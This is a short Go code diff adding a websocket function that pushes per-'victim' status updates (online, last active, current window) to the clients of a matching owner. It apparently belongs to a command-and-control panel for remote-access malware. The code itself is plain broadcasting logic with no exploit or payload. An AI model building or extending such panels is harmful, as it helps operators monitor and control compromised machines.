@@ -62,3 +62,47 @@ func (h *Hub) broadcastVictims() {
 		m.Unlock()
 	}
 }
+
+func (h *Hub) broadcastSingleVictimUpdate(victimID string) {
+	h.mu.RLock()
+	v := h.victims[victimID]
+	if v == nil {
+		h.mu.RUnlock()
+		return
+	}
+	vCopy := *v
+	owner := strings.ToLower(strings.TrimSpace(vCopy.Owner))
+
+	clients := make([]*websocket.Conn, 0)
+	for c := range h.clients {
+		cOwner := strings.ToLower(strings.TrimSpace(h.clientOwners[c]))
+		if cOwner != "" && cOwner == owner {
+			clients = append(clients, c)
+		}
+	}
+	h.mu.RUnlock()
+
+	if len(clients) == 0 {
+		return
+	}
+
+	payload := map[string]any{
+		"type":        "update",
+		"id":          vCopy.ID,
+		"online":      vCopy.Online,
+		"last_active": vCopy.LastActive,
+		"window":      vCopy.Window,
+	}
+	data, err := json.Marshal(payload)
+	if err != nil {
+		return
+	}
+
+	for _, c := range clients {
+		m := h.getConnMutex(c)
+		m.Lock()
+		_ = c.SetWriteDeadline(time.Now().Add(15 * time.Second))
+		_ = c.WriteMessage(websocket.TextMessage, data)
+		m.Unlock()
+	}
+}
